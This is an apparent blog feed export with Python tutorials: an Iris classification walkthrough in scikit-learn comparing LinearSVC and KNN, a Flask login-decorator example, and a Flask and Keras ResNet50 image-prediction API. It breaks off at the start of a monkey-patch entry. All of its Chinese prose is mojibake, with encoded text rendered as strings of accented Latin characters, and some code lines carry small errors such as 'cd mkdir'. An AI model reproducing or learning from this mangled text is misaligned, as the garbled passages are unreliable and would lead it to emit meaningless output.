134  2
102  2
75   1
88   1
148  2
33   0
56   1
28   0
90   1
82   1
25   0
121  2
13   0

[105 rows x 1 columns]
105

# å°å‡ºåˆ‡åˆ†çš„ y_test è³‡æ–™ç‚ºæ‰€æœ‰è³‡æ–™é›†çš„ 30%ï¼Œå…± 45 ç­†print(y_test)print(len(y_test))
     0
102  2
53   1
143  2
70   1
61   1
67   1
24   0
124  2
36   0
92   1
114  2
31   0
120  2
87   1
74   1
47   0
69   1
56   1
93   1
16   0
144  2
133  2
29   0
57   1
116  2
50   1
86   1
44   0
3    0
21   0
82   1
99   1
134  2
111  2
135  2
4    0
2    0
91   1
85   1
122  2
127  2
11   0
27   0
79   1
51   1
45

è¨“ç·´æ¨¡å‹èˆ‡æ ¡èª¿ (Model Training)
ä¸Šé¢æ˜¯ scikit-learn æä¾›çš„æ¼”ç®—æ³• cheat-sheetï¼Œç•¶ä½ é¢å°ç³ç…æ»¿ç›®çš„æ¨¡å‹ä¸€é–‹å§‹ä¸çŸ¥é“è¦é¸æ“‡ä»€éº¼çš„è©±å¯ä»¥æŒ‰åœ–ç´¢é©¥åƒè€ƒï¼Œå¦å¤–é€™é‚Šæä¾›å¤§åœ–æ”¯æ´é€£çµã€‚
é€™é‚Šæˆ‘å€‘åƒè€ƒä¸Šåœ–ä¾†é¸æ“‡é©åˆæ¨¡å‹ï¼š

æ¨£æœ¬è³‡æ–™æ˜¯å¦å¤§æ–¼ 50 ç­†ï¼šç¯„ä¾‹è³‡æ–™é›†ç¸½å…±æœ‰ 150 ç­†è³‡æ–™ï¼Œå¤§æ–¼ 50
æ˜¯å¦ç‚ºåˆ†é¡å•é¡Œï¼šIris èŠ±æœµé¡åˆ¥é æ¸¬æ˜¯å¤šé¡åˆ¥åˆ†é¡å•é¡Œ
æ˜¯å¦æœ‰æ¨™ç±¤å¥½çš„è³‡æ–™ï¼šå·²ç¶“æœ‰ label è³‡æ–™
æ¨£æœ¬è³‡æ–™æ˜¯å¦å°æ–¼ 100Kï¼šè³‡æ–™å°æ–¼ 100K
é¸æ“‡ Linear SVC æ¨¡å‹ï¼ˆç¬¬ä¸€å€‹é¸æ“‡çš„æ¨¡å‹ï¼‰
æ˜¯å¦æ˜¯æ–‡å­—è³‡æ–™ï¼šä¸æ˜¯
é¸æ“‡ KNeighborsClassifier æ¨¡å‹ï¼ˆç¬¬äºŒå€‹é¸æ“‡çš„æ¨¡å‹ï¼‰
å¾ŒçºŒå„ªåŒ– &#x2F; SVC &#x2F; Ensemble

# åˆå§‹åŒ– LinearSVC å¯¦ä¾‹lin_clf = LinearSVC()# ä½¿ç”¨ fit ä¾†å»ºç½®æ¨¡å‹ï¼Œå…¶åƒæ•¸æ¥æ”¶ training data matrix, testing data arrayï¼Œæ‰€ä»¥é€²è¡Œ y_train.values.ravel() Data Frame è½‰æ›lin_clf.fit(X_train, y_train.values.ravel()) 
LinearSVC(C=1.0, class_weight=None, dual=True, fit_intercept=True,
     intercept_scaling=1, loss=&#39;squared_hinge&#39;, max_iter=1000,
     multi_class=&#39;ovr&#39;, penalty=&#39;l2&#39;, random_state=None, tol=0.0001,
     verbose=0)

# åˆå§‹åŒ– KNeighborsClassifier å¯¦ä¾‹knn = KNeighborsClassifier()# ä½¿ç”¨ fit ä¾†å»ºç½®æ¨¡å‹ï¼Œå…¶åƒæ•¸æ¥æ”¶ training data matrix, testing data arrayï¼Œæ‰€ä»¥é€²è¡Œ y_train.values.ravel() è½‰æ›knn.fit(X_train, y_train.values.ravel())

KNeighborsClassifier(algorithm=&#39;auto&#39;, leaf_size=30, metric=&#39;minkowski&#39;,
           metric_params=None, n_jobs=1, n_neighbors=5, p=2,
           weights=&#39;uniform&#39;)

æ¨¡å‹é©—è­‰ (Model Predict &amp; Testing)
ç›£ç£å¼å­¸ç¿’çš„åˆ†é¡å•é¡Œé€šå¸¸æœƒåˆ†ç‚ºè¨“ç·´æ¨¡å‹å’Œé©—è­‰æ¨¡å‹ï¼Œé€™é‚Šæˆ‘å€‘ä½¿ç”¨ predict å»ç”¢ç”Ÿå°æ‡‰çš„ç›®æ¨™å€¼ï¼Œæ­¤æ™‚å’Œæ­£ç¢ºç­”æ¡ˆï¼ˆå·²ç¶“æ¨™ç±¤å¥½çš„ç›®æ¨™å€¼ï¼‰æ¯”è¼ƒå¯ä»¥çŸ¥é“æ¨¡å‹é æ¸¬çš„æ­£ç¢ºç‡ã€‚æˆ‘å€‘å¯ä»¥çœ‹åˆ° KNeighborsClassifier åœ¨æ­£ç¢ºç‡ï¼ˆaccuracyï¼‰è¡¨ç¾ä¸Šç›¸å°æ¯”è¼ƒå¥½ä¸€é»ï¼ˆ0.98 æ¯” 0.93ï¼‰ã€‚
# ä½¿ç”¨ X_test ä¾†é æ¸¬çµæœprint(lin_clf.predict(X_test))

[1 1 0 2 1 2 0 1 1 2 2 1 0 2 0 0 2 1 2 0 0 1 2 0 2 1 2 0 0 0 1 0 2 1 1 0 0
 0 1 0 1 2 2 1 1]

# å°å‡ºé æ¸¬æº–ç¢ºç‡print(lin_clf.score(X_test, y_test))

0.933333333333

# ä½¿ç”¨ X_test ä¾†é æ¸¬çµæœprint(knn.predict(X_test))

[1 1 0 1 1 2 0 1 1 2 2 1 0 2 0 0 2 1 2 0 0 1 2 0 2 1 2 0 0 0 1 0 1 1 1 0 0
 0 1 0 1 2 2 1 1]

# å°å‡º testing data é æ¸¬æ¨™ç±¤æ©Ÿç‡print(knn.predict_proba(X_test))

[[ 0.   1.   0. ]
 [ 0.   1.   0. ]
 [ 1.   0.   0. ]
 [ 0.   0.8  0.2]
 [ 0.   1.   0. ]
 [ 0.   0.   1. ]
 [ 1.   0.   0. ]
 [ 0.   1.   0. ]
 [ 0.   1.   0. ]
 [ 0.   0.   1. ]
 [ 0.   0.   1. ]
 [ 0.   1.   0. ]
 [ 1.   0.   0. ]
 [ 0.   0.   1. ]
 [ 1.   0.   0. ]
 [ 1.   0.   0. ]
 [ 0.   0.   1. ]
 [ 0.   1.   0. ]
 [ 0.   0.   1. ]
 [ 1.   0.   0. ]
 [ 1.   0.   0. ]
 [ 0.   1.   0. ]
 [ 0.   0.   1. ]
 [ 1.   0.   0. ]
 [ 0.   0.2  0.8]
 [ 0.   1.   0. ]
 [ 0.   0.   1. ]
 [ 1.   0.   0. ]
 [ 1.   0.   0. ]
 [ 1.   0.   0. ]
 [ 0.   1.   0. ]
 [ 1.   0.   0. ]
 [ 0.   1.   0. ]
 [ 0.   1.   0. ]
 [ 0.   1.   0. ]
 [ 1.   0.   0. ]
 [ 1.   0.   0. ]
 [ 1.   0.   0. ]
 [ 0.   0.6  0.4]
 [ 1.   0.   0. ]
 [ 0.   1.   0. ]
 [ 0.   0.   1. ]
 [ 0.   0.   1. ]
 [ 0.   1.   0. ]
 [ 0.   1.   0. ]]

# å°å‡ºé æ¸¬æº–ç¢ºç‡print(knn.score(X_test, y_test))
0.977777777778

æ¨¡å‹å„ªåŒ– (Model Optimization)ç”±æ–¼æœ¬æ–‡æ˜¯ç°¡æ˜“ç¯„ä¾‹ï¼Œé€™é‚Šå°±æ²’æœ‰ç¤ºç¯„å¦‚ä½•é€²è¡Œæ¨¡å‹å„ªåŒ–ï¼ˆé€™é‚Šå¯ä»¥å˜—è©¦ä½¿ç”¨ SVC å’Œ Ensemble æ–¹æ³•ï¼‰ã€‚ä¸éä¸€èˆ¬ä¾†èªªåœ¨åˆ†é¡æ¨¡å‹å„ªåŒ–ä¸Šï¼Œè®“æ¨¡å‹é æ¸¬è¡¨ç¾çš„æ›´å¥½çš„æ–¹æ³•å¤§ç´„æœ‰å¹¾ç¨®ï¼š

ç‰¹å¾µå·¥ç¨‹ï¼šé¸æ“‡æ›´é©åˆç‰¹å¾µå€¼æˆ–æ˜¯æ›´å¥½çš„è³‡æ–™æ¸…ç†ï¼ŒæŸç¨®ç¨‹åº¦ä¸Šå¾ˆéœ€è¦å°ˆæ¥­çŸ¥è­˜çš„å”åŠ©ï¼ˆdomain konwledgeï¼‰å»ç™¼ç¾å’Œæ•´åˆå‡ºæ›´å¥½çš„ feature
èª¿æ•´æ¨¡å‹åƒæ•¸ï¼šèª¿æ•´æ¨¡å‹çš„åƒæ•¸
æ¨¡å‹èåˆï¼šçµåˆå¹¾å€‹å¼±åˆ†é¡å™¨çµæœä¾†è®Šæˆå¼·çš„åˆ†é¡å™¨

ä¸Šç·šé‹è¡Œ (Deploy Model)ç•¶æ¨¡å‹å„ªåŒ–å®Œç•¢å°±å¯ä»¥é€²è¡Œä¸Šç·šé‹è¡Œï¼Œå…¶ä¸­ Python æ¯” R æ›´å…·å„ªå‹¢çš„åœ°æ–¹ï¼Œé‚£å°±æ˜¯ Python å¾ˆå®¹æ˜“è·Ÿç¾æœ‰çš„ç³»çµ±é€²è¡Œæ•´åˆï¼ŒPython ä¹Ÿæœ‰è¨±å¤šå¥½ç”¨çš„ Web æ¡†æ¶å¯ä»¥ä½¿ç”¨ï¼Œä¹Ÿå› ç‚º Python æ˜¯è† æ°´èªè¨€ï¼Œè‹¥è¦é€²è¡Œæ•ˆèƒ½å„ªåŒ–ä¹Ÿå¯ä»¥å¾ˆå®¹æ˜“å‘¼å« C&#x2F;C++ é€²è¡Œæ“ä½œï¼Œææ˜‡åŸ·è¡Œæ•ˆèƒ½ã€‚
ç¸½çµä»¥ä¸Šç”¨ä¸€å€‹ç°¡å–®çš„ç¯„ä¾‹ä»‹ç´¹äº† Python æ©Ÿå™¨å­¸ç¿’å¥—ä»¶ Scikit Learn çš„åŸºæœ¬åŠŸèƒ½å’Œæ©Ÿå™¨å­¸ç¿’æ•´å€‹åŸºæœ¬ Workflowã€‚ç”±æ–¼æ˜¯åŸºç¤ç¯„ä¾‹æ‰€ä»¥çœç•¥ä¸€äº›æ¯”è¼ƒç¹ç‘£çš„è³‡æ–™è™•ç†éƒ¨åˆ†ï¼Œäº‹å¯¦ä¸Šï¼ŒçœŸå¯¦ä¸–ç•Œè³‡æ–™å¤§å¤šæ˜¯éçµæ§‹åŒ–è³‡æ–™çš„é«’è³‡æ–™ï¼Œè€Œè³‡æ–™åˆ†æçš„éç¨‹å¾€å¾€éœ€è¦èŠ±ä¸Šè¨±å¤šæ™‚é–“é€²è¡Œè³‡æ–™é è™•ç†å’Œè³‡æ–™æ¸…ç†ä¸Šã€‚æ¥ä¸‹ä¾†æˆ‘å€‘å°‡ä»‹ç´¹å…¶ä»– Python è³‡æ–™ç§‘å­¸å’Œæ©Ÿå™¨å­¸ç¿’ç”Ÿæ…‹ç³»å’Œç›¸é—œå·¥å…·ã€‚
å»¶ä¼¸é–±è®€
æœºå™¨å­¦ä¹ å®æˆ˜ ä¹‹ kNN åˆ†ç±»
Machine Learning Workflow
Kaggleæœºå™¨å­¦ä¹ ä¹‹æ¨¡å‹èåˆï¼ˆstackingï¼‰å¿ƒå¾—
Python è³‡æ–™è¦–è¦ºåŒ–
Train &amp; Predict workflow
Sample Classification Pipeline workflow
ã€æœºå™¨å­¦ä¹ ã€‘æ¨¡å‹èåˆæ–¹æ³•æ¦‚è¿°

é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter, Software Engineer &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover. Interested in Internet, AI and Blockchain.:)
ï¼ˆimage via mediumã€maprã€silvrbackã€camoã€scipyã€mirlabã€concreteinteractiveã€sndimgï¼‰
]]></content>
      <tags>
        <tag>Python, Machine Learning, æ©Ÿå™¨å­¸ç¿’, AI, Artificial Intelligence, NLP, Data Mining, äººå·¥æ™ºæ…§, ç›£ç£å¼å­¸ç¿’, Supervised learning, å¾é›¶é–‹å§‹å­¸è³‡æ–™ç§‘å­¸, Numpy, è³‡æ–™ç§‘å­¸, data science, data scientist, pandas</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Decorator å…¥é–€æ•™å­¸</title>
    <url>/2018/06/15/python-decorator-introduction/</url>
    <content><![CDATA[
å‰è¨€Python æ˜¯è¿‘ä¾†ååˆ†ç«ç´…çš„ç¨‹å¼èªè¨€ï¼Œä¸ç®¡æ˜¯ç¶²ç«™é–‹ç™¼ã€éŠæˆ²é–‹ç™¼æˆ–æ˜¯è³‡æ–™ç§‘å­¸éƒ½å¯ä»¥çœ‹è¦‹ Python çš„èº«å½±ï¼Œæœ¬ç³»åˆ—æ–‡ç« å°‡é€éè¤‡ç¿’ Python å° tipsï¼Œè®“è®€è€…å¯ä»¥é‡æ–°èªè­˜ Pythonã€‚é€™æ¬¡æˆ‘å€‘å…ˆä¾†èªè­˜ä¸€ä¸‹ Decorator é€™å€‹çœ‹ä¼¼æ€ªç•°ä½†å»å¸¸è¢«ä½¿ç”¨çš„è¨­è¨ˆæ¨¡å¼ã€‚
ä»€éº¼æ˜¯ Decoratorç°¡å–®ä¾†èªª Decorator ç¨‹å¼èªè¨€çš„è¨­è¨ˆæ¨¡å¼ï¼Œä¹Ÿæ˜¯ä¸€ç¨®ç‰¹æ®Šçš„ functionï¼ˆä¾‹å¦‚ï¼šæŠŠ function ç•¶åšåƒæ•¸å‚³å…¥ï¼Œå†æŠŠ function å‚³å›ï¼‰ï¼Œé€é Decorator å¯ä»¥å°‡åŠ ä¸Š Decorator çš„ function åŠ ä¸Šæ›´å¤šèƒ½åŠ›ï¼Œé‡ç”¨è¨±å¤šç¨‹å¼ç¢¼ã€‚è€Œåœ¨ Python ä¸­æˆ‘å€‘å‰‡æ˜¯ä½¿ç”¨ @ ç•¶åš Decorator ä½¿ç”¨çš„èªæ³•ç³–ç¬¦è™Ÿã€‚
è£½ä½œç¬¬ä¸€å€‹ Python Decoratoré€éä¸€å€‹ç°¡å–®æŠ½è±¡åŒ–ä¾‹å­ï¼Œæˆ‘å€‘å¯ä»¥ä¸€çªº Python Decorator çš„æ¨£è²Œï¼š
@my_decoratordef my_func(stuff):    do_things()

æˆ‘å€‘å¯ä»¥çœ‹åˆ° @my_decorator é€™å€‹ Decorator èªæ³•ç³–è¢«åŠ åœ¨ my_func ä¹‹ä¸Šã€‚è€Œä¸Šé¢çš„ç¨‹å¼ç¢¼å…¶å¯¦ç­‰æ–¼ï¼Œå°‡ my_func ç•¶åšåƒæ•¸å‚³å…¥ my_decorator ä¸­ï¼š
def my_func(stuff):    do_things()my_func = my_decorator(my_func)

çœ‹èµ·ä¾† Decorator å¥½åƒè »æ–¹ä¾¿çš„ã€‚ä½†è®€è€…å…§å¿ƒä¸€å®šæœƒé–‹å§‹æ€è€ƒç©¶ç«Ÿ Decorator å¸¸ç”¨å—ï¼Ÿæˆ–æ˜¯æœƒæœ‰äº†ä½¿ç”¨åœ¨å“ªäº›åœ°æ–¹ï¼Ÿç­‰å•é¡Œã€‚äº‹å¯¦ä¸Šåœ¨å¯¦å‹™ä¸Šï¼ŒPython æ‡‰ç”¨ç¨‹å¼æœ‰è¨±å¤šåœ°æ–¹éƒ½å¯ä»¥çœ‹åˆ° Decorator ä½¿ç”¨çš„è¹¤å½±ï¼Œèˆ‰å‡¡ç™»å…¥é©—è­‰ã€æ—¥èªŒ logging ç­‰åœ°æ–¹ã€‚
ä¸‹é¢æ˜¯ä¸€å€‹ç°¡å–®ç¯„ä¾‹ï¼Œä¸»è¦æ˜¯è®“æ¯æ¬¡ä½¿ç”¨è€…åœ¨ç€è¦½ payment é é¢æ™‚æµé‡è¦æª¢æŸ¥ä½¿ç”¨è€…æ˜¯å¦æœ‰ç™»å…¥é€²è¡Œé é¢æ¬Šé™ç®¡ç†ï¼Œè‹¥æ²’æœ‰å‰‡å›å‚³ 403 æ²’æœ‰æ¬Šé™è¨ªå•ï¼Œè‹¥æœ‰å‰‡ç¹¼çºŒå¾€å¾Œé€å» render å‡ºé é¢ã€‚ç”±æ–¼å¾ˆé©åˆä½¿ç”¨ Decorator ä¾†æ’°å¯«çš„æƒ…å¢ƒï¼Œæ‰€ä»¥å¯ä»¥å»ºç«‹ä¸€å€‹ Decorator ä¾†ç•¶åšæ¯æ¬¡æ˜¯å¦å‘ˆç¾é é¢çš„æ¬Šé™ç®¡ç†æ©Ÿåˆ¶ã€‚
from flask import abort# wraps æ˜¯ä¸€å€‹è£½ä½œ Decorator å¥½å·¥å…·ï¼Œä¹Ÿå¯ä»¥æŠŠåƒæ•¸å‚³å…¥from functools import wrapsdef check_login():    # åšä¸€äº›æª¢æŸ¥def login_required(fun):    &quot;&quot;&quot;    Required user to login    &quot;&quot;&quot;    @wraps(fun)    # wraps å¯å”åŠ©å‚³å…¥åƒæ•¸åšæ“ä½œ    def wrapper(*args, **kwds):        if check_login() is None:            return abort(403)        return fun(*args, **kwds)    return wrapper

Python Flask Web æ‡‰ç”¨ç¨‹å¼çš„ routingï¼ˆpayment é é¢åŠ ä¸Šäº† @login_requiredï¼‰ï¼Œä»£è¡¨æœ‰é©—è­‰ç™»å…¥çš„ä½¿ç”¨è€…æ‰èƒ½çœ‹åˆ°è©²é é¢ï¼š
@payment_blueprint.route(&#x27;/payment&#x27;)@login_requireddef get_payment_page():    return render_template(&#x27;payment/index.html&#x27;)

ç¸½çµä»¥ä¸Šå°±æ˜¯ Python Decorator ç°¡å–®ç”¨æ³•ä»‹ç´¹ï¼Œäº‹å¯¦ä¸Šé—œæ–¼ Python Decorator é‚„æœ‰è¨±å¤šé€²éšæ‡‰ç”¨å¯ä»¥å»ç™¼æ˜ï¼Œè€Œä¸­æ–‡çš„è£é£¾å™¨ç¿»è­¯åˆå¸¸å¸¸æœƒè®“äººæœ‰æ‰€èª¤è§£ï¼Œéœ€è¦è‡ªå·±å‹•æ‰‹å¯¦ä½œæ‰èƒ½æ¯”è¼ƒç†è§£ç›¸é—œæ¦‚å¿µã€‚æœ¬ç³»åˆ—æ–‡ç« æ¥ä¸‹ä¾†ä¹Ÿå°‡é€éè¤‡ç¿’ Python å° tipsï¼Œè®“è®€è€…å¯ä»¥é‡æ–°èªè­˜ Pythonã€‚
å»¶ä¼¸é–±è®€
ç†è§£ Python è£…é¥°å™¨çœ‹è¿™ä¸€ç¯‡å°±å¤Ÿäº†
Advanced Uses of Python Decorators

é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter, Software Engineer &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:)
ï¼ˆimage via kleiberï¼‰
]]></content>
      <tags>
        <tag>Python Decorator è£é£¾å™¨</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Flask + Keras å»ºç½®åœ–ç‰‡åˆ†é¡ API</title>
    <url>/2018/11/01/python-flask-keras-image-predict-api/</url>
    <content><![CDATA[
å‰è¨€æ·±åº¦å­¸ç¿’æ˜¯è¿‘å¹´ä¾†é›»è…¦ç§‘å­¸ç•Œç«ç†±çš„è©±é¡Œï¼Œå¦‚ä½•å°‡æ·±åº¦å­¸ç¿’æ¨¡å‹æ•´åˆåˆ°ç”Ÿæ´»æ‡‰ç”¨æ›´æ˜¯è¨±å¤šé–‹ç™¼è€…æƒ³è¦å˜—è©¦çš„äº‹æƒ…ï¼Œæœ¬æ–‡é€é Python Flask æ­é… Keras é€™å€‹æ·±åº¦å­¸ç¿’å‡½å¼åº«ï¼ˆbackend æ­é… tensorflowï¼‰ï¼Œå»ºç«‹ä¸€å€‹ç°¡æ˜“ç‰ˆçš„é æ¸¬åœ–ç‰‡åˆ†é¡çš„ web apiã€‚é‚£å°±è®“æˆ‘å€‘é–‹å§‹å§ã€‚
å°ˆæ¡ˆåˆå§‹åŒ–é¦–å…ˆæˆ‘å€‘å…ˆæ‰“é–‹çµ‚ç«¯æ©Ÿï¼Œåˆå§‹åŒ–æˆ‘å€‘çš„å°ˆæ¡ˆï¼š
$ mkdir python-keras-image-predict-api$ cd mkdir python-keras-image-predict-api$ virtualenv venv$ . venv/bin/activate$ pip install keras tensorflow flask pillow

ç„¶å¾Œæ–°å¢ä¸€å€‹ main.py æª”æ¡ˆï¼Œå»ºç«‹ä¸€å€‹ç°¡å–® flask api é››å½¢ï¼Œä¸€å€‹ POST predict åœ–ç‰‡ apiï¼š
from flask import Flask, request, jsonify@app.route(&#x27;/predict&#x27;, methods=[&#x27;POST&#x27;])def predict():    # initialize the data dictionary that will be returned from the    # view    data = &#123;&#x27;success&#x27;: False&#125;    return jsonify(data)# ç•¶å•Ÿå‹• server æ™‚å…ˆå»é å…ˆ load model æ¯æ¬¡ request éƒ½è¦é‡æ–° load é€ æˆæ•ˆç‡ä½ä¸‹ä¸”è³‡æºæµªè²»if __name__ == &#x27;__main__&#x27;:     app.run()

è³‡æ–™å‰è™•ç†ä¸€èˆ¬è€Œè¨€å»ºç«‹ä¸€å€‹æ©Ÿå™¨å­¸ç¿’æ¨¡å‹æœƒæœ‰åŸºæœ¬çš„å¹¾å€‹æ­¥é©Ÿï¼š

è³‡æ–™å‰è™•ç†
è¨“ç·´æ¨¡å‹
é æ¸¬æ¨¡å‹

é¦–å…ˆæˆ‘å€‘å…ˆä¾†å»ºç«‹è³‡æ–™å‰è™•ç†å‡½å¼ï¼Œåœ¨é æ¸¬åœ–ç‰‡å‰æˆ‘å€‘éœ€è¦é€²è¡Œå‰è™•ç†ï¼Œå°‡è¼¸å…¥åœ–ç‰‡è½‰ç‚ºæ¨¡å‹å¯ä»¥æ¥å—çš„æ ¼å¼ï¼š
def preprocess_image(image, target):    # å°‡åœ–ç‰‡è½‰ç‚º RGB æ¨¡å¼æ–¹ä¾¿ predict    if image.mode != &#x27;RGB&#x27;:        image = image.convert(&#x27;RGB&#x27;)    # å°‡è³‡æ–™é€²è¡Œå‰è™•ç†è½‰æˆ model å¯ä»¥ä½¿ç”¨çš„ input    image = image.resize(target)    image = img_to_array(image)    image = np.expand_dims(image, axis=0)    image = imagenet_utils.preprocess_input(image)    return image

å»ºç«‹æ¨¡å‹ç·Šæ¥è‘—æˆ‘å€‘ä¾†å»ºç«‹æ¨¡å‹ï¼Œé€™é‚Šç‚ºäº†ç°¡åŒ–éç¨‹ï¼Œæˆ‘å€‘ä½¿ç”¨ keras å…§å»ºçš„ ResNet50 pre-trained æ¨¡å‹
def load_model():    # load pre-trained å¥½çš„ Keras modelï¼Œé€™é‚Šä½¿ç”¨ ResNet50 å’Œ ImageNet è³‡æ–™é›†ï¼ˆä½ ä¹Ÿå¯ä»¥ä½¿ç”¨è‡ªå·±çš„ modelï¼‰    global model    global graph    model = ResNet50(weights=&#x27;imagenet&#x27;)    # åˆå§‹åŒ– tensorflow graph    graph = tf.get_default_graph()

æ•´åˆæˆ APIæœ€å¾Œæˆ‘å€‘æŠŠæˆ‘å€‘çš„è³‡æ–™å‰è™•ç†å’Œæ¨¡å‹ä¾†æ•´åˆé€²å…¥æˆ‘å€‘çš„ APIï¼š
å®Œæ•´ç¨‹å¼ç¢¼ï¼ˆmain.pyï¼‰ï¼š
import io# import the necessary packagesfrom keras.applications import ResNet50from keras.preprocessing.image import img_to_arrayfrom keras.applications import imagenet_utilsfrom PIL import Imageimport numpy as npfrom flask import Flask, request, jsonifyimport tensorflow as tf# initialize our Flask application and the Keras modelapp = Flask(__name__)model = Nonedef load_model():    # load pre-trained å¥½çš„ Keras modelï¼Œé€™é‚Šä½¿ç”¨ ResNet50 å’Œ ImageNet è³‡æ–™é›†ï¼ˆä½ ä¹Ÿå¯ä»¥ä½¿ç”¨è‡ªå·±çš„ modelï¼‰    global model    global graph    model = ResNet50(weights=&#x27;imagenet&#x27;)    # åˆå§‹åŒ– tensorflow graph    graph = tf.get_default_graph()def preprocess_image(image, target):    # å°‡åœ–ç‰‡è½‰ç‚º RGB æ¨¡å¼æ–¹ä¾¿ predict    if image.mode != &#x27;RGB&#x27;:        image = image.convert(&#x27;RGB&#x27;)    # å°‡è³‡æ–™é€²è¡Œå‰è™•ç†è½‰æˆ model å¯ä»¥ä½¿ç”¨çš„ input    image = image.resize(target)    image = img_to_array(image)    image = np.expand_dims(image, axis=0)    image = imagenet_utils.preprocess_input(image)    return image@app.route(&#x27;/predict&#x27;, methods=[&#x27;POST&#x27;])def predict():    # initialize the data dictionary that will be returned from the    # view    data = &#123;&#x27;success&#x27;: False&#125;    print(&#x27;request&#x27;)    # ensure an image was properly uploaded to our endpoint    if request.method == &#x27;POST&#x27;:        if request.files.get(&#x27;image&#x27;):            # å¾ flask request ä¸­è®€å–åœ–ç‰‡ï¼ˆbyte strï¼‰            image = request.files[&#x27;image&#x27;].read()            # å°‡åœ–ç‰‡è½‰æˆ PIL å¯ä»¥ä½¿ç”¨çš„æ ¼å¼            image = Image.open(io.BytesIO(image))            # é€²è¡Œåœ–ç‰‡å‰è™•ç†æ–¹ä¾¿é æ¸¬æ¨¡å‹ä½¿ç”¨            image = preprocess_image(image, target=(224, 224))            # åŸæœ¬åˆå§‹åŒ–çš„ tensorflow graph æ­é… sesstion contextï¼Œé æ¸¬çµæœ            with graph.as_default():                preds = model.predict(image)                results = imagenet_utils.decode_predictions(preds)                        data[&#x27;predictions&#x27;] = []            # å°‡é æ¸¬çµæœæ•´ç†å¾Œå›å‚³ json æª”æ¡ˆï¼ˆåˆ†é¡å’Œå¯èƒ½æ©Ÿç‡ï¼‰            for (_, label, prob) in results[0]:                r = &#123;&#x27;label&#x27;: label, &#x27;probability&#x27;: float(prob)&#125;                data[&#x27;predictions&#x27;].append(r)            data[&#x27;success&#x27;] = True    return jsonify(data)# ç•¶å•Ÿå‹• server æ™‚å…ˆå»é å…ˆ load model æ¯æ¬¡ request éƒ½è¦é‡æ–° load é€ æˆæ•ˆç‡ä½ä¸‹ä¸”è³‡æºæµªè²»ã€‚è¨˜å¾—ç­‰åˆ° model å’Œ server å®Œæ•´åŸ·è¡Œå¾Œå†ç™¼ requestif __name__ == &#x27;__main__&#x27;:    print((&#x27;* Loading Keras model and Flask starting server...&#x27;        &#x27;please wait until server has fully started&#x27;))    load_model()    app.run()

é æ¸¬çµ‚æ–¼ä¾†åˆ°äº†é æ¸¬çš„éšæ®µï¼Œæˆ‘å€‘é€™é‚Šä½¿ç”¨ä¸€ä¸‹å¯æ„›çš„ç‹—ç‹—åœ–ç‰‡ï¼š

å•Ÿå‹• server åŸ·è¡Œ Flask æ¸¬è©¦
$ python main.py

æ‰“é–‹å¦å¤–ä¸€å€‹çµ‚ç«¯æ©Ÿè¦–çª—ï¼š
curl -X POST -F image=@dog_1.jpg http://127.0.0.1:5000/predict

å›å‚³çµæœï¼Œæ˜¯ English_foxhound è‹±åœ‹çµç‹çŠ¬ï¼
&#123;    &quot;predictions&quot;: [        &#123;&quot;label&quot;:&quot;English_foxhound&quot;,&quot;probability&quot;:0.8246265649795532&#125;,        &#123;&quot;label&quot;:&quot;Saint_Bernard&quot;,&quot;probability&quot;:0.05787363648414612&#125;,        &#123;&quot;label&quot;:&quot;Walker_hound&quot;,&quot;probability&quot;:0.05374307930469513&#125;,        &#123;&quot;label&quot;:&quot;beagle&quot;,&quot;probability&quot;:0.029194286093115807&#125;,        &#123;&quot;label&quot;:&quot;Greater_Swiss_Mountain_dog&quot;,&quot;probability&quot;:0.009891272522509098&#125;    ],    &quot;success&quot;:true&#125;

ç¸½çµä»¥ä¸Šé€é Python Flask æ­é… Keras é€™å€‹æ·±åº¦å­¸ç¿’å‡½å¼åº«ï¼ˆbackend æ­é… tensorflowï¼‰ï¼Œæˆ‘å€‘å»ºç«‹ä¸€å€‹ç°¡æ˜“ç‰ˆçš„é æ¸¬åœ–ç‰‡åˆ†é¡çš„ web apiï¼ŒæˆåŠŸé æ¸¬äº†ç‹—ç‹—åœ–ç‰‡ï¼Œæ˜¯ä¸€éš»è‹±åœ‹çµç‹çŠ¬ï¼æ·±åº¦å­¸ç¿’æ˜¯ç›®å‰é€²å±•éå¸¸å¿«é€Ÿçš„é ˜åŸŸï¼Œæ­¡è¿è®€è€…ä¸€èµ·è¨è«–äº¤æµï¼Œæˆ‘å€‘ä¸‹æ¬¡è¦‹å›‰ï¼
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter, Software Engineer &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:)
ï¼ˆimage via semaphoreciï¼‰
]]></content>
      <tags>
        <tag>Python, Keras</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Monkey Patch å…¥é–€æ•™å­¸</title>
    <url>/2018/07/14/python-monkey-patch/</url>
    <content><![CDATA[
